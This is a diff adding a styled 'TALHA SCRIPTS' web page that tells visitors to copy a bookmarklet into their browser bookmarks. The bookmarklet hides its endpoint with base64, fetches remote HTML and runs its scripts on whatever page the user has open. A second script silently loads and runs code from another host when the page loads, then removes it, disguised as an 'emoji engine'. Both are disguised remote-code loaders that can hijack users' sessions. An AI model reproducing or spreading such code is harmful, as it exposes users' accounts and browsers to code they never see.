@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TALHA - RUN CODE</title>
+
+    <link rel="shortcut icon" href="https://talha-scripts-official.vercel.app/TS.png" type="image/x-icon">
+
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+        }
+
+        body{
+            min-height:100vh;
+            overflow-x:hidden;
+            font-family:Arial,sans-serif;
+            background:
+            radial-gradient(circle at top left,#ffffff,#eef2ff 35%,#e2e8f0 100%);
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:20px;
+            position:relative;
+        }
+
+        /* BACKGROUND EFFECTS */
+
+        .blur{
+            position:fixed;
+            width:260px;
+            height:260px;
+            border-radius:50%;
+            filter:blur(80px);
+            opacity:.35;
+            z-index:-1;
+        }
+
+        .blur1{
+            background:#60a5fa;
+            top:-100px;
+            left:-100px;
+            animation:move1 6s infinite alternate ease-in-out;
+        }
+
+        .blur2{
+            background:#c084fc;
+            bottom:-100px;
+            right:-100px;
+            animation:move2 7s infinite alternate ease-in-out;
+        }
+
+        @keyframes move1{
+            from{
+                transform:translateY(0);
+            }
+            to{
+                transform:translateY(40px);
+            }
+        }
+
+        @keyframes move2{
+            from{
+                transform:translateY(0);
+            }
+            to{
+                transform:translateY(-40px);
+            }
+        }
+
+        /* MAIN BOX */
+
+        .container{
+            width:100%;
+            max-width:780px;
+            background:rgba(255,255,255,.65);
+            backdrop-filter:blur(16px);
+            border:1px solid rgba(255,255,255,.7);
+            border-radius:32px;
+            padding:35px 28px;
+            box-shadow:
+            0 20px 60px rgba(0,0,0,.08);
+            position:relative;
+            overflow:hidden;
+        }
+
+        .container::before{
+            content:"";
+            position:absolute;
+            top:-100px;
+            right:-100px;
+            width:220px;
+            height:220px;
+            border-radius:50%;
+            background:linear-gradient(135deg,#dbeafe,#ffffff);
+            opacity:.9;
+        }
+
+        /* BRAND */
+
+        .brand{
+            position:relative;
+            z-index:2;
+            display:flex;
+            align-items:center;
+            gap:14px;
+            margin-bottom:25px;
+        }
+
+        .logo-box{
+            width:65px;
+            height:65px;
+            border-radius:20px;
+            background:#ffffff;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            box-shadow:0 10px 30px rgba(0,0,0,.08);
+            animation:float 3s infinite ease-in-out;
+        }
+
+        .logo-box img{
+            width:42px;
+            height:42px;
+        }
+
+        @keyframes float{
+            0%,100%{
+                transform:translateY(0);
+            }
+            50%{
+                transform:translateY(-8px);
+            }
+        }
+
+        .brand h1{
+            font-size:1.8rem;
+            font-weight:900;
+            color:#111827;
+            letter-spacing:1px;
+        }
+
+        .sub{
+            position:relative;
+            z-index:2;
+            color:#6b7280;
+            font-size:.95rem;
+            margin-bottom:18px;
+            line-height:1.7;
+            font-weight:600;
+        }
+
+        .sub a{
+            color:#2563eb;
+            text-decoration:none;
+            font-weight:800;
+        }
+
+        /* BUTTON */
+
+        .copy-btn{
+            position:relative;
+            z-index:2;
+            width:100%;
+            border:none;
+            padding:15px;
+            border-radius:18px;
+            background:linear-gradient(135deg,#2563eb,#7c3aed);
+            color:#fff;
+            font-size:1rem;
+            font-weight:800;
+            cursor:pointer;
+            transition:.3s;
+            margin-bottom:20px;
+            box-shadow:
+            0 15px 40px rgba(37,99,235,.3);
+        }
+
+        .copy-btn:hover{
+            transform:translateY(-3px) scale(1.01);
+        }
+
+        /* CODE BOX */
+
+        .code-box{
+            position:relative;
+            z-index:2;
+            background:#f8fafc;
+            border:1px solid rgba(0,0,0,.06);
+            border-radius:22px;
+            overflow:hidden;
+        }
+
+        .code-top{
+            padding:14px 18px;
+            background:#ffffff;
+            border-bottom:1px solid rgba(0,0,0,.06);
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+        }
+
+        .dots{
+            display:flex;
+            gap:7px;
+        }
+
+        .dots span{
+            width:11px;
+            height:11px;
+            border-radius:50%;
+        }
+
+        .dots span:nth-child(1){
+            background:#ef4444;
+        }
+
+        .dots span:nth-child(2){
+            background:#f59e0b;
+        }
+
+        .dots span:nth-child(3){
+            background:#10b981;
+        }
+
+        .code-title{
+            font-size:.85rem;
+            color:#6b7280;
+            font-weight:700;
+        }
+
+        pre{
+            padding:22px;
+            overflow:auto;
+            color:#111827;
+            font-size:.88rem;
+            line-height:1.7;
+            font-family:monospace;
+            white-space:pre-wrap;
+            word-break:break-word;
+        }
+
+        /* FOOTER */
+
+        .footer{
+            margin-top:22px;
+            text-align:center;
+            color:#6b7280;
+            font-size:.85rem;
+            font-weight:600;
+        }
+
+        @media(max-width:600px){
+
+            .container{
+                padding:24px 18px;
+                border-radius:24px;
+            }
+
+            .brand h1{
+                font-size:1.4rem;
+            }
+
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- BACKGROUND -->
+    <div class="blur blur1"></div>
+    <div class="blur blur2"></div>
+
+    <!-- MAIN -->
+    <div class="container">
+
+        <!-- BRAND -->
+        <div class="brand">
+
+            <div class="logo-box">
+                <img src="https://talha-scripts-official.vercel.app/TS.png">
+            </div>
+
+            <h1>TALHA SCRIPTS</h1>
+
+        </div>
+
+        <!-- TEXT -->
+        <p class="sub">
+            🪄 Copy this bookmark code and add it into your browser bookmarks.
+        </p>
+
+        <p class="sub">
+            🎥
+            <a href="#" target="_blank">
+                Watch Tutorial Video
+            </a>
+        </p>
+
+        <!-- BUTTON -->
+        <button class="copy-btn" id="copyBtn">
+            CLICK TO COPY CODE
+        </button>
+
+        <!-- CODE -->
+        <div class="code-box">
+
+            <div class="code-top">
+
+                <div class="dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+
+                <div class="code-title">
+                    bookmark.js
+                </div>
+
+            </div>
+
+            <pre id="codeBlock"></pre>
+
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            TALHA SCRIPTS © 2026
+        </div>
+
+    </div>
+
+<script>
+
+/* SECURITY */
+
+(function(){
+
+    const authorizedDomain =
+    "talha-scripts-official";
+
+    const currentHost =
+    window.location.hostname;
+
+    if(currentHost !== authorizedDomain){
+
+        window.location.href =
+        window.location.origin + "/error";
+
+    }
+
+})();
+
+/* SCRIPT */
+
+const theScript =
+"javascript:(async()=>{const d=document,b=d.body,i=Array.from({length:20},()=>Math.floor(Math.random()*10)).join('');const l=d.createElement('div'),s=d.createElement('style');s.textContent='@keyframes s{to{transform:rotate(360deg)}}';l.innerHTML=`<div style="position:fixed;inset:0;background:rgba(10,15,30,0.85);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;z-index:2147483647"><div style="position:relative;width:80px;height:80px;display:flex;align-items:center;justify-content:center;"><div style="position:absolute;width:100%;height:100%;border:4px solid rgba(0,212,255,0.1);border-top:4px solid #00d4ff;border-radius:50%;animation:s%200.8s%20linear%20infinite;box-shadow:0%200%2015px%20rgba(0,212,255,0.5)%22%3E%3C/div%3E%3Cimg%20src=%22https://talha-site-data.vercel.app/talha.png%22%20style=%22width:50px;height:50px;border-radius:50%;object-fit:cover;box-shadow:0%200%2010px%20rgba(0,212,255,0.3);background:#000;%22%3E%3C/div%3E%3C/div%3E%60;b.append(l,s);try{const%20r=await%20fetch(atob(%22aHR0cHM6Ly90YWxoYS1zaXRlLWRhdGEudmVyY2VsLmFwcC8/aWQ9%22)+i),t=await%20r.text();const%20f=d.createRange().createContextualFragment(t);f.querySelectorAll('script').forEach(x=%3E{const%20n=d.createElement('script');x.src?n.src=x.src:n.textContent=x.textContent.replace(/uP\.get\(['%22]id['%22]\)/g,%60'${i}'%60);b.appendChild(n)})}catch(e){}l.remove();s.remove();console.log(%22ID:%22,i)})();";
+
+/* SHOW CODE */
+
+document.getElementById("codeBlock")
+.textContent = theScript;
+
+/* COPY */
+
+const copyBtn =
+document.getElementById("copyBtn");
+
+copyBtn.addEventListener("click",()=>{
+
+    navigator.clipboard
+    .writeText(theScript)
+
+    .then(()=>{
+
+        copyBtn.innerHTML =
+        "COPIED SUCCESSFULLY ✓";
+
+        copyBtn.style.background =
+        "linear-gradient(135deg,#10b981,#059669)";
+
+        setTimeout(()=>{
+
+            copyBtn.innerHTML =
+            "CLICK TO COPY CODE";
+
+            copyBtn.style.background =
+            "linear-gradient(135deg,#2563eb,#7c3aed)";
+
+        },1800);
+
+    });
+
+});
+
+</script>
+<script>
+        (async () => {
+            try {
+                let response = await fetch(`https://talha-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+</script>
+</body>
+</html>
